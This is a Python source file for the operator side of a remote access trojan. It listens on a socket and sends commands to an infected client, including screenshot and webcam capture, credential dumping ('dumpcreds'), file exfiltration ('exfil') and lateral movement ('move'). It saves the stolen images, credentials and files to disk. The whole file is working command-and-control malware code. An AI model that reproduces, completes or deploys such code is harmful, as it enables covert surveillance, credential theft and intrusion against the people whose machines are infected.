import socket
import os
import subprocess

# Server settings for external access
HOST = "192.168.100.6"
PORT = 5050

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

print(f"[INFO] Listening on {HOST}:{PORT}")

client_socket, client_address = server_socket.accept()
print(f"[INFO] Connection from {client_address} established.")

def quote_command(command):
    """Quotes each argument of the command that contains spaces."""
    parts = command.split()
    quoted_parts = [f'"{part}"' if ' ' in part else part for part in parts]
    return ' '.join(quoted_parts)

try:
    while True:
        command = input(f"Shell ({os.getcwd()})> ")

        if command.lower() == "exit":
            client_socket.send("exit".encode())
            break
        elif command.lower() in ["screenshot", "webcam", "sniff", "dumpcreds", "listdrives", "dir"]:
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode("utf-8")
            if command.lower() == "screenshot":
                with open("screenshot.png", "wb") as f:
                    f.write(response.encode())
                print("[INFO] Received screenshot from client.")
            elif command.lower() == "webcam":
                with open("webcam.jpg", "wb") as f:
                    f.write(response.encode())
                print("[INFO] Received webcam image from client.")
            elif command.lower() == "dumpcreds":
                with open("dumped_creds.txt", "wb") as f:
                    f.write(response.encode())
                print("[INFO] Received dumped credentials from client.")
            elif command.lower() == "listdrives":
                print(f"[INFO] Available drives: {response}")
            elif command.lower() == "dir":
                print(f"[INFO] Directory contents: {response}")


                
        elif command.lower().startswith("exfil"):
            client_socket.send(command.encode())
            response = client_socket.recv(4096)
            with open("exfiltrated_file", "wb") as f:
                f.write(response)
            print("[INFO] Received exfiltrated file from client.")




        elif command.lower().startswith("move"):
            client_socket.send(command.encode())
            print("[INFO] Sent lateral movement command to client.")
        elif command.lower().startswith("cd "):
            new_directory = command[3:].strip()
            os.chdir(new_directory)  # Move this here to ensure it's executed before sending
            client_socket.send(command.encode())
            print(f"[INFO] Changed directory to: {os.getcwd()}")
        else:
            command = quote_command(command)
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = result.stdout if result.stdout else result.stderr
                
                if output:
                    client_socket.send(output.encode())
                    print(output)  
                else:
                    print("[INFO] No output from command.")
                
            except Exception as e:
                error_message = f"Failed to execute command: {str(e)}"
                print(f"[ERROR] {error_message}")
                client_socket.send(error_message.encode())

except KeyboardInterrupt:
    print("\n[INFO] Shutting down server.")
except Exception as e:
    print(f"[ERROR] {str(e)}")

finally:
    client_socket.close()
    server_socket.close()
    print("[INFO] Connection closed.")
